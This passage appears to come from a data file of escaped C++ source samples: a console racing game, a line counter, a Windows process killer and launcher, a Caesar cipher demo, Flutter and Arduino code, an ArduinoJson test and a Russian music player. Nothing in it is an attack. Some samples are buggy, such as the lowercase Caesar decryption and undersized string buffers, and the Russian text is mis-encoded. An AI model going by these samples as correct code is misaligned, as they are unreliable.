true;\r\n\t}\r\n\r\n\r\n\r\n\r\n\t// Called by olcConsoleGameEngine\r\n\tvirtual bool OnUserUpdate(float fElapsedTime)\r\n\t{\r\n\t\t// Handle control input\r\n\t\tint nCarDirection = 0;\r\n\r\n\t\tif (m_keys[VK_UP].bHeld)\r\n\t\t\tfSpeed += 2.0f * fElapsedTime;\r\n\t\telse\r\n\t\t\tfSpeed -= 1.0f * fElapsedTime;\r\n\r\n\t\t// Car Curvature is accumulated left/right input, but inversely proportional to speed\r\n\t\t// i.e. it is harder to turn at high speed\r\n\t\tif (m_keys[VK_LEFT].bHeld)\r\n\t\t{\r\n\t\t\tfPlayerCurvature -= 0.7f * fElapsedTime * (1.0f - fSpeed / 2.0f);\r\n\t\t\tnCarDirection = -1;\r\n\t\t}\r\n\r\n\t\tif (m_keys[VK_RIGHT].bHeld)\r\n\t\t{\r\n\t\t\tfPlayerCurvature += 0.7f * fElapsedTime * (1.0f - fSpeed / 2.0f);\r\n\t\t\tnCarDirection = +1;\r\n\t\t}\r\n\r\n\t\t// If car curvature is too different to track curvature, slow down\r\n\t\t// as car has gone off track\r\n\t\tif (fabs(fPlayerCurvature - fTrackCurvature) >= 0.8f)\r\n\t\t\tfSpeed -= 5.0f * fElapsedTime;\r\n\r\n\t\t// Clamp Speed\r\n\t\tif (fSpeed < 0.0f)\tfSpeed = 0.0f;\r\n\t\tif (fSpeed > 1.0f)\tfSpeed = 1.0f;\r\n\t\t\r\n\t\t// Move car along track according to car speed\r\n\t\tfDistance += (70.0f * fSpeed) * fElapsedTime;\r\n\t\t\r\n\t\t// Get Point on track\r\n\t\tfloat fOffset = 0;\r\n\t\tint nTrackSection = 0;\r\n\r\n\t\t// Lap Timing and counting\r\n\t\tfCurrentLapTime += fElapsedTime;\r\n\t\tif (fDistance >= fTrackDistance)\r\n\t\t{\r\n\t\t\tfDistance -= fTrackDistance;\r\n\t\t\tlistLapTimes.push_front(fCurrentLapTime);\r\n\t\t\tlistLapTimes.pop_back();\r\n\t\t\tfCurrentLapTime = 0.0f;\r\n\t\t}\r\n\t\t\r\n\t\t// Find position on track (could optimise)\r\n\t\twhile (nTrackSection < vecTrack.size() && fOffset <= fDistance)\r\n\t\t{\t\t\t\r\n\t\t\tfOffset += vecTrack[nTrackSection].second;\r\n\t\t\tnTrackSection++;\r\n\t\t}\r\n\t\t\r\n\t\t// Interpolate towards target track curvature\r\n\t\tfloat fTargetCurvature = vecTrack[nTrackSection - 1].first;\r\n\t\tfloat fTrackCurveDiff = (fTargetCurvature - fCurvature) * fElapsedTime * fSpeed;\r\n\r\n\t\t// Accumulate player curvature\r\n\t\tfCurvature += fTrackCurveDiff;\r\n\r\n\t\t// Accumulate track curvature\r\n\t\tfTrackCurvature += (fCurvature) * fElapsedTime * fSpeed;\r\n\r\n\t\t// Draw Sky - light blue and dark blue\r\n\t\tfor (int y = 0; y < ScreenHeight() / 2; y++)\r\n\t\t\tfor (int x = 0; x < ScreenWidth(); x++)\r\n\t\t\t\tDraw(x, y, y< ScreenHeight() / 4 ? PIXEL_HALF : PIXEL_SOLID, FG_DARK_BLUE);\r\n\r\n\t\t// Draw Scenery - our hills are a rectified sine wave, where the phase is adjusted by the\r\n\t\t// accumulated track curvature\r\n\t\tfor (int x = 0; x < ScreenWidth(); x++)\r\n\t\t{\r\n\t\t\tint nHillHeight = (int)(fabs(sinf(x * 0.01f + fTrackCurvature) * 16.0f));\r\n\t\t\tfor (int y = (ScreenHeight() / 2) - nHillHeight; y < ScreenHeight() / 2; y++)\r\n\t\t\t\tDraw(x, y, PIXEL_SOLID, FG_DARK_YELLOW);\r\n\t\t}\r\n\r\n\r\n\t\t// Draw Track - Each row is split into grass, clip-board and track\r\n\t\tfor (int y = 0; y < ScreenHeight() / 2; y++)\r\n\t\t\tfor (int x = 0; x < ScreenWidth(); x++)\r\n\t\t\t{\r\n\t\t\t\t// Perspective is used to modify the width of the track row segments\r\n\t\t\t\tfloat fPerspective = (float)y / (ScreenHeight()/2.0f);\r\n\t\t\t\tfloat fRoadWidth = 0.1f + fPerspective * 0.8f; // Min 10% Max 90%\r\n\t\t\t\tfloat fClipWidth = fRoadWidth * 0.15f;\r\n\t\t\t\tfRoadWidth *= 0.5f;\t// Halve it as track is symmetrical around center of track, but offset...\r\n\r\n\t\t\t\t// ...depending on where the middle point is, which is defined by the current\r\n\t\t\t\t// track curvature.\r\n\t\t\t\tfloat fMiddlePoin",
    "#include \"lineAnalyze.hpp\"\n\nvoid fileProcess::lineAnalyze(fs::path directoryPath) {\n    if (!fs::exists(directoryPath)) {\n        wcerr << L\"path doesn't exist: \" << directoryPath << endl;\n        return;\n    }\n    int fileNumOfThis = 0;\n\n    wstring fileName = directoryPath.filename().wstring();\n    int commentTotal = 0;\n    int blankTotal = 0;\n    int statementTotal = 0;\n\n    for (const fs::path& entry : fs::directory_iterator(directoryPath)) {\n        if (fs::is_directory(entry)) {\n            lineAnalyze(entry);\n        } else {\n            wstring extension = entry.extension().wstring();\n            if (extension.empty()) {\n                continue;\n            }\n//            the line under can be freely changed, to analyze the code type you prefer\n            if (extension == L\".cpp\" || extension == L\".hpp\" || extension == L\".c\" || extension == L\".h\") {\n                fileNumOfThis++;\n                wstring currName = entry.filename().wstring();\n                if (currName.empty()) {\n                    continue;\n                }\n                // \u4f7f\u7528 wifstream \u6253\u5f00\u6587\u4ef6\n                std::wifstream file(entry);\n                // \u8bbe\u7f6e\u672c\u5730\u5316\u73af\u5883\n                file.imbue(std::locale(std::locale(), new std::codecvt_utf8<wchar_t>));\n\n                if (!file.is_open()) {\n                    wcerr << L\"cannot open file: \" << entry.wstring() << endl;\n                    continue;\n                }\n\n                std::wstring line;\n                int currBlank = 0;\n                int currComment = 0;\n                int currStatement = 0;\n\n                while (std::getline(file, line)) {\n                    if (line.empty()) {\n                        currBlank++;\n                        continue;\n                    } else if (line.length() >= 2 && line[0] == L'/' && line[1] == L'/') {\n                        currComment++;\n                        continue;\n                    } else {\n                        currStatement++;\n                    }\n                }\n                commentTotal += currComment;\n                blankTotal += currBlank;\n                statementTotal += currStatement;\n\n                file.close();\n                this->add(currName, currComment, currBlank, currStatement, 1);\n            } else {\n                continue;\n            }\n        }\n    }\n    if (fileNumOfThis > 0) {\n        this->add(fileName, commentTotal, blankTotal, statementTotal, fileNumOfThis);\n    }\n}\n\nvoid fileProcess::add(wstring _fileName, int _commentNum, int _blankNum, int _statementNum, int _fileNum) {\n    if (this->p == nullptr) {\n        this->p = new fileNode(_fileName, _commentNum, _blankNum, _statementNum, _fileNum);\n        this->p->next = nullptr;\n        len++;\n        return;\n    }\n    fileNode* current = this->p;\n    while (current->next != nullptr) {\n        current = current->next;\n    }\n    current->next = new fileNode(_fileName, _commentNum, _blankNum, _statementNum, _fileNum);\n    current->next->next = nullptr;\n    len++;\n}\n\nbool is_fullwidth(wchar_t c) {\n    // \u6839\u636e Unicode \u7801\u70b9\u8303\u56f4\u5224\u65ad\n    // \u7b80\u5355\u5730\u8bf4\uff0cCJK\uff08\u4e2d\u6587\u3001\u65e5\u6587\u3001\u97e9\u6587\uff09\u5b57\u7b26\u901a\u5e38\u4f4d\u4e8e\u4ee5\u4e0b\u8303\u56f4\n    return (c >= 0x1100 && c <= 0x115F) || // Hangul Jamo\n           (c >= 0x2E80 && c <= 0xA4CF) || // CJK Radicals Supplement .. Yi Radicals\n           (c >= 0xAC00 && c <= 0xD7A3) || // Hangul Syllables\n           (c >= 0xF900 && c <= 0xFAFF) || // CJK Compatibility Ideographs\n           (c >= 0xFE10 && c <= 0xFE19) || // Vertical Forms\n           (c >= 0xFE30 && c <= 0xFE6F) || // CJK Compatibility Forms\n           (c >= 0xFF00 && c <= 0xFF60) || // Halfwidth and Fullwidth Forms\n           (c >= 0xFFE0 && c <= 0xFFE6);\n}\n\n// \u8ba1\u7b97\u5b57\u7b26\u4e32\u7684\u663e\u793a\u5bbd\u5ea6\nint get_display_width(const std::wstring& str) {\n    int width = 0;\n    for (wchar_t c : str) {\n        if (is_fullwidth(c)) {\n            width += 2;\n        } else {\n            width += 1;\n        }\n    }\n    return width;\n}\n//\u4e0a\u9762\u8fd9\u4e24\u4e2a\u51fd\u6570\u662f\u4ece\u7f51\u4e0a\u627e\u7684\u5999\u5999\u5de5\u5177\uff0c\u4e13\u95e8\u7528\u6765\u5904\u7406\u975e\u82f1\u6587\u7684\u5b57\u7b26\u4e32\uff0cdo not change\uff0cI don't know how they work\nvoid fileProcess::print() {\n    CONSOLE_SCREEN_BUFFER_INFO csbi;\n    int width;\n    if (GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &csbi)) {\n        width = csbi.srWindow.Right - csbi.srWindow.Left + 1;\n    }\n\n    const int nameWidth = 22;\n    const int extraWidth = 2;  // \u4e2d\u6587\u6587\u4ef6\u540d\u989d\u5916\u7684\u5bbd\u5ea6\u8865\u507f\n\n    wcout << L\"totally \" << len << L\" items           \";\n    wcout << L\"statementNum\" << L\" \" << L\"commentNum\" << L\"  \" << L\"blankNum  \";\n    wcout << L\"perBlank  \" << L\"perComment  \" << L\"avgStmt  \" << L\"avgLine  \" << endl;\n    for (int i = 0; i < width; i++) {\n        wcout << L\"=\";\n    }\n    wcout << endl;\n\n    fileNode* count = p;\n    while (count != nullptr) {\n        int totalLine = count->statementNum + count->blankNum + count->commentNum;\n        if (totalLine == 0) {\n            totalLine = 1;\n        }\n\n        std::wstring fileName = count->fileName;\n        int nameDisplayWidth = get_display_width(fileName);\n\n        // \u5bf9\u542b\u6709\u4e2d\u6587\u5b57\u7b26\u7684\u6587\u4ef6\u540d\u884c\u8fdb\u884c\u989d\u5916\u5bbd\u5ea6\u8865\u507f\n        if (nameDisplayWidth > nameWidth) {\n            nameDisplayWidth += extraWidth;  ",
    "#include <windows.h>\r\n#include <tlhelp32.h>\r\n#include <iostream>\r\n#include <thread>\r\n#include <chrono>\r\n\r\nDWORD GetProcessIDByName(const char* processName) {\r\n    PROCESSENTRY32 entry;\r\n    entry.dwSize = sizeof(PROCESSENTRY32);\r\n\r\n    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);\r\n\r\n    if (Process32First(snapshot, &entry) == TRUE) {\r\n        while (Process32Next(snapshot, &entry) == TRUE) {\r\n            if (strcmp(entry.szExeFile, processName) == 0) {\r\n                CloseHandle(snapshot);\r\n                return entry.th32ProcessID;\r\n            }\r\n        }\r\n    }\r\n\r\n    CloseHandle(snapshot);\r\n    return 0; // If process not found\r\n}\r\n\r\nbool IsProcessRunning(const char* processName) {\r\n    return GetProcessIDByName(processName) != 0;\r\n}\r\n\r\nvoid TerminateProcessByName(const char* processName) {\r\n    DWORD processID = GetProcessIDByName(processName);\r\n\r\n    if (processID == 0) {\r\n        std::cerr << \"Process not found\\n\";\r\n        return;\r\n    }\r\n\r\n    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processID);\r\n\r\n    if (hProcess == NULL) {\r\n        std::cerr << \"Failed to open process. Error: \" << GetLastError() << \"\\n\";\r\n        return;\r\n    }\r\n\r\n    if (TerminateProcess(hProcess, 0)) {\r\n        std::cout << \"Process terminated successfully.\\n\";\r\n    } else {\r\n        std::cerr << \"Failed to terminate process. Error: \" << GetLastError() << \"\\n\";\r\n    }\r\n\tstd::cout << \"Terminated process ID: \" << processID << std::endl;\r\n    CloseHandle(hProcess);\r\n}\r\nvoid RunProcess(const char* processPath) {\r\n   STARTUPINFO si;\r\n   PROCESS_INFORMATION pi;\r\n\r\n   // Initialize memory for startup info and process info structures\r\n   ZeroMemory(&si, sizeof(si));\r\n   si.cb = sizeof(si); // Required for STARTUPINFO structure\r\n   ZeroMemory(&pi, sizeof(pi));\r\n\r\n   // Start the process\r\n   if (!CreateProcess(\r\n           processPath,   // Path to the executable file\r\n           NULL,          // Command line arguments (NULL if none)\r\n           NULL,          // Process handle not inheritable\r\n           NULL,          // Thread handle not inheritable\r\n           FALSE,         // Handle inheritance option\r\n           0,             // No creation flags\r\n           NULL,          // Use parent's environment block\r\n           NULL,          // Use parent's starting directory\r\n           &si,           // Pointer to STARTUPINFO structure\r\n           &pi))          // Pointer to PROCESS_INFORMATION structure\r\n   {\r\n       std::cerr << \"CreateProcess failed. Error: \" << GetLastError() << \"\\n\";\r\n       return;\r\n   }\r\n\r\n   std::cout << \"Process started successfully!\\n\";\r\n\r\n   // Wait until child process exits (optional)\r\n   WaitForSingleObject(pi.hProcess, INFINITE);\r\n\r\n   // Close process and thread handles\r\n   CloseHandle(pi.hProcess);\r\n   CloseHandle(pi.hThread);\r\n}\r\nint main() {\r\nstart:  std::cout<<\"Enter 1 to kill a process or Enter 2 to run a process:\";\r\n    \tint x; \r\n    \tstd::cin>>x; \r\n    \tif (x==1) {\r\n    \t\tstd::cout<<\"Enter the name of process that you want to terminate it: \";\r\n    \t\tstd::string s;\r\n    \t\tstd::cin>>s; \r\n    \t\tstd::cin>>s;\r\n    \t\tconst char* processName = s.c_str();\r\n    \t\twhile (IsProcessRunning(processName)) {\r\n        \t\tstd::cout << \"Process is still running... attempting to terminate\\n\";\r\n        \t\tTerminateProcessByName(processName);\r\n    \t\t}\r\n\t}\r\n    \telse if (x==2){\r\n\t\tstd::cout<<\"Enter the name of process that you want to run it: \";\r\n\t\tstd::string s; \r\n\t\tstd::cin>>s;\r\n\t\tconst char* processName =s.c_str();\r\n\t\tRunProcess(processName);\r\n\t}\r\n   \telse{\r\n\t\tstd::cout<<\"Input is invalid please enter correct it\"<<std::endl;\r\n\t\tgoto start;\r\n\t}\r\n\r\n\t\r\n    \r\n    return 0;\r\n}\r\n",
    "#include <iostream>\r\n#include <vector>\r\n\r\n// Do not use \"using namespace std;\"\r\n// because it can cause conflicts with other libraries you use\r\n// it is always safer to use the standard resolution operator \"::\" \r\n// it is the C++ version of class.method in Python\r\n\r\n/*\r\ncaeser cipher basically works by shifting each letter in the alphabet by n places\r\nand then decrypting by shifting back n places\r\n\r\na good example is the letter a shifted by 5 places would be f and then f shifted back 5 places would be a\r\n\r\na hint: the modulo operator with the number 26 will come in hand\r\n\r\nhttps://www.geeksforgeeks.org/caesar-cipher-in-cryptography/\r\n*/\r\n\r\n// Encryption function \r\n// recieves the text and the shift key and returns encrypted text\r\nstd::string Encrypt(std::string text, int ShiftKey)\r\n{\r\n    std::string result = \"\";\r\n\r\n    // Loops through every character in the text\r\n    for (int i = 0; i < text.length(); i++)\r\n    {\r\n        // Upper case encrypt\r\n        if (isupper(text[i]))\r\n        {\r\n            result += char(int(text[i] + ShiftKey - 65) % 26 + 65);\r\n        }\r\n        // Lower case encrypt\r\n        else\r\n        {\r\n            result += char(int(text[i] + ShiftKey - 97) % 26 + 97);\r\n        }\r\n        \r\n    }\r\n    \r\n    // Returns the encrypted text\r\n    return result;\r\n}\r\n\r\n// Decryption function\r\n// Recieves encrypted text and shift key and returns decrypted text\r\nstd::string Decrypt(std::string EncryptedText, int ShiftKey)\r\n{\r\n    std::string result = \"\";\r\n\r\n    for (int i = 0; i < EncryptedText.length(); i++)\r\n    {\r\n        if (isupper(EncryptedText[i]))\r\n        {\r\n            result += char(int(EncryptedText[i] - ShiftKey + 65) % 26 + 65);\r\n        }\r\n        else\r\n        {\r\n            result += char(int(EncryptedText[i] - ShiftKey - 97) % 26 + 97);\r\n        }\r\n    }\r\n\r\n    return result;\r\n}\r\n\r\nint main() \r\n{\r\n    // Sets the values\r\n    std::string text = \"\";\r\n    int ShiftKey = 3; \r\n\r\n    // Gets the user input and saves it as text variable\r\n    std::cout << \"Enter a phrase you want encrypted: \";\r\n    std::cin >> text; \r\n    \r\n    // Outputs the User encrypted text and decrypted text\r\n    std::string EncryptedText = Encrypt(text, ShiftKey);\r\n    std::cout << \"The Encrypted text: \" << EncryptedText << \"\\n\";\r\n    std::cout << \"The Decrypted text: \" << Decrypt(EncryptedText, ShiftKey);\r\n\r\n    return 0;\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"tugas1login\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"hidjoystickrptparser.h\"\n\nJoystickReportParser::JoystickReportParser(JoystickEvents *evt) :\njoyEvents(evt),\noldHat(0xDE),\noldButtons(0) {\n        for (uint8_t i = 0; i < RPT_GEMEPAD_LEN; i++)\n                oldPad[i] = 0xD;\n}\n\nvoid JoystickReportParser::Parse(USBHID *hid, bool is_rpt_id, uint8_t len, uint8_t *buf) {\n        bool match = true;\n\n        // Checking if there are changes in report since the method was last called\n        for (uint8_t i = 0; i < RPT_GEMEPAD_LEN; i++)\n                if (buf[i] != oldPad[i]) {\n                        match = false;\n                        break;\n                }\n\n        // Calling Game Pad event handler\n        if (!match && joyEvents) {\n                joyEvents->OnGamePadChanged((const GamePadEventData*)buf);\n\n                for (uint8_t i = 0; i < RPT_GEMEPAD_LEN; i++) oldPad[i] = buf[i];\n        }\n\n        uint8_t hat = (buf[5] & 0xF);\n\n        // Calling Hat Switch event handler\n        if (hat != oldHat && joyEvents) {\n                joyEvents->OnHatSwitch(hat);\n                oldHat = hat;\n        }\n\n        uint16_t buttons = (0x0000 | buf[6]);\n        buttons <<= 4;\n        buttons |= (buf[5] >> 4);\n        uint16_t changes = (buttons ^ oldButtons);\n\n        // Calling Button Event Handler for every button changed\n        if (changes) {\n                for (uint8_t i = 0; i < 0x0C; i++) {\n                        uint16_t mask = (0x0001 << i);\n\n                        if (((mask & changes) > 0) && joyEvents) {\n                                if ((buttons & mask) > 0)\n                                        joyEvents->OnButtonDn(i + 1);\n                                else\n                                        joyEvents->OnButtonUp(i + 1);\n                        }\n                }\n                oldButtons = buttons;\n        }\n}\n\nJoystickEvents::JoystickEvents(bool *turboOn) {\n  this->turboOn = turboOn;\n}\n\nvoid JoystickEvents::OnGamePadChanged(const GamePadEventData *evt) {\n\n  \n#ifdef debug\n        Serial.print(\"X1: \");\n        PrintHex<uint8_t > (evt->X, 0x80);\n        Serial.print(\"\\tY1: \");\n        PrintHex<uint8_t > (evt->Y, 0x80);\n        Serial.print(\"\\tX2: \");\n        PrintHex<uint8_t > (evt->Z1, 0x80);\n        Serial.print(\"\\tY2: \");\n        PrintHex<uint8_t > (evt->Z2, 0x80);\n        Serial.print(\"\\tRz: \");\n        PrintHex<uint8_t > (evt->Rz, 0x80);\n        Serial.println(\"\");\n#endif\n\n        if(evt->Y == 0x00) {\n          pinMode(BTNUP, OUTPUT);\n        } else {\n          pinMode(BTNUP, INPUT);\n        }\n\n        if(evt->Y == 0xFF) {\n          pinMode(BTNDOWN, OUTPUT);\n        } else {\n          pinMode(BTNDOWN, INPUT);\n        }\n\n        if(evt->X == 0x00) {\n          pinMode(BTNLEFT, OUTPUT);\n        } else {\n          pinMode(BTNLEFT, INPUT);\n        }\n\n        if(evt->X == 0xFF) {\n          pinMode(BTNRIGHT, OUTPUT);\n        } else {\n          pinMode(BTNRIGHT, INPUT);\n        }\n}\n\nvoid JoystickEvents::OnHatSwitch(uint8_t hat) {\n#ifdef debug\n        Serial.print(\"Hat Switch: \");\n        PrintHex<uint8_t > (hat, 0x80);\n        Serial.println(\"\");\n#endif\n}\n\nvoid JoystickEvents::OnButtonUp(uint8_t but_id) {\n#ifdef debug\n        Serial.print(\"Up: \");\n        Serial.println(but_id, DEC);\n#endif\n        \n        if(but_id == 1) {\n          *this->turboOn = false;\n          pinMode(FIRE1, INPUT);\n        }\n        \n        if(but_id == 2) {\n          pinMode(FIRE1, INPUT);\n        }\n        \n        if(but_id == 3) {\n          pinMode(FIRE2, INPUT);\n        }\n}\n\nvoid JoystickEvents::OnButtonDn(uint8_t but_id) {\n#ifdef debug\n        Serial.print(\"Dn: \");\n        Serial.println(but_id, DEC);\n#endif\n        \n        if(but_id == 1) {\n          *this->turboOn = true;\n          pinMode(FIRE1, OUTPUT);\n        }\n        \n        if(but_id == 2) {\n          pinMode(FIRE1, OUTPUT);\n        }\n        \n        if(but_id == 3) {\n          pinMode(FIRE2, OUTPUT);\n        }\n}\n",
    "// ArduinoJson - https://arduinojson.org\n// Copyright \u00a9 2014-2024, Benoit BLANCHON\n// MIT License\n\n#include <ArduinoJson.h>\n#include <catch.hpp>\n\n#include <stdlib.h>  // malloc, free\n#include <string>\n\n#include \"Allocators.hpp\"\n#include \"Literals.hpp\"\n\nTEST_CASE(\"JsonDocument::clear()\") {\n  SpyingAllocator spy;\n  JsonDocument doc(&spy);\n\n  SECTION(\"null\") {\n    doc.clear();\n\n    REQUIRE(doc.isNull());\n    REQUIRE(spy.log() == AllocatorLog{});\n  }\n\n  SECTION(\"releases resources\") {\n    doc[\"hello\"_s] = \"world\"_s;\n    spy.clearLog();\n\n    doc.clear();\n\n    REQUIRE(doc.isNull());\n    REQUIRE(spy.log() == AllocatorLog{\n                             Deallocate(sizeofPool()),\n                             Deallocate(sizeofString(\"hello\")),\n                             Deallocate(sizeofString(\"world\")),\n                         });\n  }\n\n  SECTION(\"clear free list\") {  // issue #2034\n    JsonObject obj = doc.to<JsonObject>();\n    obj[\"a\"] = 1;\n    obj.clear();  // puts the slot in the free list\n\n    doc.clear();\n\n    doc[\"b\"] = 2;  // will it pick from the free list?\n  }\n}\n",
    "#define _CRT_SECURE_NO_WARNINGS\r\n#include <iostream>\r\n#include <io.h>\r\n#include <windows.h>\r\n#include <mmsystem.h>\r\n\r\n#pragma comment(lib, \"winmm.lib\")\r\nvoid razdel();\r\nvoid spravka();\r\n\r\n\r\n\r\nint main() {\r\n\tsetlocale(LC_ALL, \"RUSSIAN\");\r\n\tint switchMenu{};\r\n\r\n\tint musics{1}; // \u00ca\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00ef\u00e5\u00f1\u00e5\u00ed\r\n\tint musicsL{}; // \u00ca\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00ef\u00e5\u00f1\u00e5\u00ed \u00eb\u00ee\u00ea\u00e0\u00eb\u00fc\u00ed\u00ee\r\n\r\n\tint pls{ 1 };\r\n\tint plsL{};\r\n\r\n\tstruct _finddata_t file;\r\n\tintptr_t hFile;\r\n\r\n\r\n\tconst int SIZE{ 50 };\r\n\tconst int sizeOfMusic{ 100 };\r\n\r\n\tchar musicR[SIZE]{ \".wav\" };\r\n\tchar musicName[SIZE]{ \"1\" };\r\n\tchar musicWay[SIZE]{ \"allMusic/\" };\r\n\r\n\tchar newMusicFullname[]{ \"\" };\r\n\tchar musicFullname[]{\"\"};\r\n\r\n\t\r\n\r\n\tchar newMusicName[SIZE]{ \"\" };\r\n\r\n\t\r\n\tchar* arrFullname[sizeOfMusic]; //\u00cc\u00ee\u00e6\u00ed\u00ee \u00e4\u00ee\u00e1\u00e0\u00e2\u00e8\u00f2\u00fc \u00e2\u00fb\u00e1\u00ee\u00f0 \u00ef\u00e5\u00f1\u00ed\u00e8 \u00ef\u00ee \u00e5\u00b8 \u00ed\u00ee\u00ec\u00e5\u00f0\u00f3 \u00e4\u00eb\u00ff \u00ef\u00e5\u00f0\u00e5\u00e8\u00ec\u00e5\u00ed\u00ee\u00e2\u00e0\u00ed\u00e8\u00ff \u00e8 \u00ed\u00e5 \u00f2\u00ee\u00eb\u00fc\u00ea\u00ee\r\n\t\r\n\tint i{};\r\n\tint i2{}; // \u00e4\u00eb\u00ff \u00e2\u00fb\u00f5\u00ee\u00e4\u00e0 \u00e8\u00e7 \u00f6\u00e8\u00ea\u00eb\u00e0 \u00e2 \u00ef\u00eb\u00e5\u00e9\u00eb\u00e8\u00f1\u00f2\u00e0\u00f5\r\n\tint i3{}; // \u00e4\u00eb\u00ff case(2)\r\n\r\n\tstd::cout << \"\u00d1\u00ef\u00e8\u00f1\u00ee\u00ea \u00e2\u00f1\u00e5\u00f5 \u00e7\u00e0\u00e3\u00f0\u00f3\u00e6\u00e5\u00ed\u00ed\u00fb\u00f5 \u00ef\u00e5\u00f1\u00e5\u00ed: \" << std::endl << std::endl;\r\n\tif ((hFile = _findfirst(\"AllMusic/*.wav\", &file)) == -1L) {\r\n\t\tstd::cerr << \"\u00cd\u00e5 \u00f3\u00e4\u00e0\u00eb\u00ee\u00f1\u00fc \u00ee\u00f2\u00ea\u00f0\u00fb\u00f2\u00fc \u00f4\u00e0\u00e9\u00eb\u00fb\" << std::endl;\r\n\t\treturn 1;\r\n\t}\r\n\telse {\r\n\t\tdo {\r\n\r\n\t\t\tarrFullname[musicsL] = new char[strlen(file.name)];\r\n\t\t\tstrcpy(arrFullname[musicsL], file.name);\r\n\t\t\tmusicsL++;\r\n\t\t\tstd::cout << musicsL << \") \" << file.name << std::endl;\r\n\r\n\t\t} while (_findnext(hFile, &file) == 0);\r\n\t\t_findclose(hFile);\r\n\r\n\t\tstd::cout << std::endl << \"\\t\u00ca\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00ef\u00e5\u00f1\u00e5\u00ed: \" << musicsL << std::endl;\r\n\t\tmusics = musicsL;\r\n\t\tmusicsL = 0;\r\n\t}\r\n\trazdel();\r\n\r\n\twhile (!(i == 1)) {\r\n\t\tstd::cout << \"\u00cc\u00e5\u00ed\u00fe: (\u00c4\u00eb\u00ff \u00e2\u00fb\u00f5\u00ee\u00e4\u00e0 \u00ed\u00e0\u00e6\u00ec\u00e8\u00f2\u00e5 Ctrl + C) \" << std::endl;\r\n\t\tstd::cout << \"1) \u00ce\u00f2\u00ee\u00e1\u00f0\u00e0\u00e7\u00e8\u00f2\u00fc \u00f1\u00ef\u00e8\u00f1\u00ee\u00ea \u00e2\u00f1\u00e5\u00f5 \u00e7\u00e0\u00e3\u00f0\u00f3\u00e6\u00e5\u00ed\u00ed\u00fb\u00f5 \u00ef\u00e5\u00f1\u00e5\u00ed\" << std::endl;\r\n\t\tstd::cout << \"2) \u00c2\u00ea\u00eb\u00fe\u00f7\u00e8\u00f2\u00fc \u00ef\u00e5\u00f1\u00ed\u00fe\" << std::endl;\r\n\t\tstd::cout << \"3) \u00cf\u00e5\u00f0\u00e5\u00e8\u00ec\u00e5\u00ed\u00ee\u00e2\u00e0\u00f2\u00fc \u00ef\u00e5\u00f1\u00ed\u00fe\" << std::endl;\r\n\t\tstd::cout << \"4) \u00cf\u00eb\u00e5\u00e9\u00eb\u00e8\u00f1\u00f2\u00fb (\u00cd\u00c5 \u00d0\u00c0\u00c1\u00ce\u00d2\u00c0\u00c5\u00d2)\" << std::endl;\r\n\t\tstd::cout << \"5) \u00c2\u00fb\u00e9\u00f2\u00e8\" << std::endl;\r\n\t\tstd::cout << \"6) \u00d1\u00ef\u00f0\u00e0\u00e2\u00ea\u00e0/\u00cf\u00ee\u00ec\u00ee\u00f9\u00fc(?)\" << std::endl; // \u00ce\u00f2\u00e2\u00e5\u00f7\u00e0\u00e5\u00f2 \u00ed\u00e0 \u00ee\u00f1\u00ed\u00ee\u00e2\u00ed\u00fb\u00e5 \u00e2\u00ee\u00ef\u00f0\u00ee\u00f1\u00fb\r\n\t\tstd::cout << \"\u00c2\u00e0\u00f8 \u00e2\u00fb\u00e1\u00ee\u00f0: \";\r\n\t\tstd::cin >> switchMenu;\r\n\t\trazdel();\r\n\t\tswitch (switchMenu)\r\n\t\t{\r\n\t\tcase(1):\r\n\t\t\tif ((hFile = _findfirst(\"AllMusic/*.wav\", &file)) == -1L) {\r\n\t\t\t\tstd::cerr << \"\u00cd\u00e5 \u00f3\u00e4\u00e0\u00eb\u00ee\u00f1\u00fc \u00ee\u00f2\u00ea\u00f0\u00fb\u00f2\u00fc \u00f4\u00e0\u00e9\u00eb\u00fb\" << std::endl;\r\n\t\t\t\treturn 1;\r\n\t\t\t}\r\n\t\t\telse {\r\n\t\t\t\tdo {\r\n\t\t\t\t\t\r\n\t\t\t\t\tarrFullname[musicsL] = new char[strlen(file.name)];\r\n\t\t\t\t\tstrcpy(arrFullname[musicsL], file.name);\r\n\t\t\t\t\tmusicsL++;\r\n\t\t\t\t\tstd::cout << musicsL << \") \" << file.name << std::endl;\r\n\t\t\t\t\t\r\n\t\t\t\t} while (_findnext(hFile, &file) == 0);\r\n\t\t\t\t_findclose(hFile);\r\n\r\n\t\t\t\tstd::cout << std::endl << \"\\t\u00ca\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00ef\u00e5\u00f1\u00e5\u00ed: \" << musicsL << std::endl;\r\n\t\t\t\tmusics = musicsL;\r\n\t\t\t\tmusicsL = 